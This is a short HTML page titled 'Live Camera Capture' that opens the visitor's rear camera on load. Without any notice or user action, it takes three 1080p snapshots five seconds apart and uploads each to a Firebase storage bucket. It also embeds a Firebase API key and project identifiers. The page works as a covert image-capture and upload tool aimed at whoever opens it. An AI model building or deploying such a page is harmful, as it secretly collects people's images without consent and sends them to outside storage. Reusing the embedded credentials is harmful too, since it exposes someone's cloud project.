<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Camera Capture</title>
    <link rel="stylesheet" href="style.css">
    <!-- Include Firebase SDK -->
    <script type="module">
        // Import the functions you need from the SDKs you need
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";

        // Your web app's Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
            authDomain: "html-7fd9b.firebaseapp.com",
            projectId: "html-7fd9b",
            storageBucket: "html-7fd9b.appspot.com",
            messagingSenderId: "1022361191925",
            appId: "1:1022361191925:web:5bf0fb4023990d83aa0cbc"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        // Function to upload image to Firebase
        function uploadImage(imageData) {
            const storageRef = ref(storage, 'captured_images/image_' + Date.now() + '.png'); // Generate unique filename
            uploadString(storageRef, imageData, 'data_url').then((snapshot) => {
                console.log('Uploaded a blob or file!');
            }).catch((error) => {
                console.error('Error uploading image:', error);
            });
        }

        // Access the video, canvas, and image elements
        window.addEventListener('load', () => {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            const capturedImage = document.getElementById('capturedImage');
            let captureCount = 0; // To track the number of captures
            const maxCaptures = 3; // Maximum number of images to capture

            // Function to start capturing
            navigator.mediaDevices.getUserMedia({ video: { 
                facingMode: 'environment', 
                width: { ideal: 1920 }, 
                height: { ideal: 1080 } 
            }})
                .then(stream => {
                    video.srcObject = stream;

                    video.onloadedmetadata = () => {
                        canvas.width = 1920;  // Set canvas width to 1920 for 1080p
                        canvas.height = 1080; // Set canvas height to 1080 for 1080p

                        // Automatically capture images every 5 seconds
                        const captureInterval = setInterval(() => {
                            if (captureCount < maxCaptures) {
                                captureImage();
                                captureCount++;
                            } else {
                                clearInterval(captureInterval); // Stop capturing after reaching the max count
                            }
                        }, 5000); // 5 seconds
                    };
                })
                .catch(err => {
                    console.error('Error accessing camera: ', err);
                });

            // Function to capture image
            function captureImage() {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/png');
                capturedImage.src = imageData;
                capturedImage.style.display = 'block'; // Make the image visible

                // Automatically upload the image to the server
                uploadImage(imageData);
            }
        });
    </script>
</head>
<body>
    <h1>Live Camera Capture</h1>
    <div class="container">
        <video id="video" autoplay></video>
        <canvas id="canvas" style="display: none;"></canvas>
        <img id="capturedImage" alt="Captured Image" />
    </div>
</body>
</html>
